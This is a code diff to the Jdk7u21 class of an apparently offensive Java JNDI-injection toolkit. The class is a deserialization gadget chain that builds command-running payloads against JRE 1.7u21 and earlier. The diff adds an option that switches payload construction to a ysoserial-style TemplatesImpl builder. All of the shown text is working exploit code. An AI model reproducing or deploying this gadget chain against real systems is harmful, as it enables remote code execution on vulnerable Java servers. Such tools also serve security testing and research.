@@ -4,6 +4,7 @@ import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.JavaVersion;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 
@@ -13,6 +14,8 @@ import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
 import java.util.HashMap;
 import java.util.LinkedHashSet;
+
+import static com.qi4l.jndi.Starter.cmdLine;
 
 /**
  * Gadget chain that works against JRE 1.7u21 and earlier. Payload generation has
@@ -57,7 +60,12 @@ import java.util.LinkedHashSet;
 public class Jdk7u21 implements ObjectPayload<Object> {
 
     public Object getObject(PayloadType type, String... param) throws Exception {
-        final Object templates = Gadgets.createTemplatesImpl(type, param);
+        final Object templates;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            templates = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            templates = Gadgets.createTemplatesImpl(type, param);
+        }
 
         // hashCode 为 0 的字符串
         String zeroHashCodeStr = "f5a5a608";
